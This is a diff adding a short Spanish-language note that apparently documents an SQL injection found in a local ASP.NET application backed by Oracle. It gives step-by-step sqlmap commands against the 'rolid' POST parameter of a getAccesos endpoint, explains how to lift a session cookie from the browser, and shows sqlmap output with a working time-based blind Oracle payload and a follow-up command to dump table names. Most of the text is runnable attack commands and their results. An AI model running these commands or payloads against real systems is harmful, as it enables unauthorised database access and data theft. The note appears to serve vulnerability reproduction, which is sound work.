@@ -1,0 +1,20 @@
+instalar sqlmap
+tomar una url y asignarla al siguiente codigo
+sqlmap -u http://localhost:5000/AccessMainteiner/getAccesos/ --data="rolid=ADMIN" -p rolid --cookie="ASP.NET_SessionId=zfv4ofj2kxvfs00huluwdi4r"
+Para obtener la cookie se puede hacer una ves loqueado en el sistio desde el navegador nos vamos a  aplicacion y/o storage , donde se almacenan las cookies y tenemos las cookies ASP.NET_SessionId=zfv4ofj2kxvfs00huluwdi4r (imagen adjunta)
+Desde la consola ejecutar el comando
+sqlmap -u http://localhost:5000/AccessMainteiner/getAccesos/ --data="rolid=ADMIN" -p rolid --cookie="ASP.NET_SessionId=zfv4ofj2kxvfs00huluwdi4r"
+espera que se ejecute y los resultados
+Resultado
+Parameter: rolid (POST)
+    Type: time-based blind
+    Title: Oracle AND time-based blind
+    Payload: rolid=ADMIN' AND 8341=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101)||CHR(112)||CHR(81)||CHR(87),5) AND 'SaAo'='SaAo
+---
+[13:53:58] [INFO] the back-end DBMS is Oracle
+web server operating system: Windows 10 or 11 or 2016 or 2019 or 2022
+web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET
+back-end DBMS: Oracle (editado) 
+
+para obtener el squema
+sqlmap -u http://localhost:5000/AccessMainteiner/getAccesos/ --data="rolid=ADMIN" -p rolid --cookie="ASP.NET_SessionId=zfv4ofj2kxvfs00huluwdi4r" --tables
